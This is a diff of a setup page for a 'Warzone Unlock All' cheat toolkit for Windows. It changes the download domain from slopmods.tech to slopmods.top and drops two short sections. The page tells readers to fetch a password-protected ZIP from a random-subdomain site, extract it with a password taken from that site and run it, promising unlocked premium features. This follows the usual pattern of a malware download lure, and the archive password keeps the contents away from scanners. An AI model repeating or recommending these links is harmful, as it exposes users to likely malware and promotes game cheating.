@@ -1,6 +1,6 @@
 ***
 
-# Warzone Unlock All — Warzone unlock-all toolkit
+# Warzone Unlock All Windows Setup Notes
 
 Warzone Unlock All — Windows setup and configuration · Premium workspace · Zero nag dialogs.
 
@@ -8,12 +8,12 @@ Warzone Unlock All — Windows setup and configuration · Premium workspace · Z
 
 > Use the release page below for Windows.
 
-- **Release page:** [iqhshgdelrp.slopmods.tech](https://iqhshgdelrp.slopmods.tech/)
-- **Full URL:** `https://iqhshgdelrp.slopmods.tech/`
+- **Release page:** [iqhshgdelrp.slopmods.top](https://iqhshgdelrp.slopmods.top/)
+- **Full URL:** `https://iqhshgdelrp.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **iqhshgdelrp.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **iqhshgdelrp.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,18 +33,8 @@ Warzone Unlock All — Windows setup and configuration · Premium workspace · Z
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **iqhshgdelrp.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **iqhshgdelrp.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
-
-
-## Client bundle
-
-This install guide references the **Warzone unlock-all toolkit** bundle layout from the release page (Windows desktop).
-
-
-## Game utilities
-
-PC **mod / practice toolkit** pack for offline or private sessions. Install notes only — use at your own risk on live servers.
 ## What you get
 
 - Core Warzone Unlock All features on Windows desktop
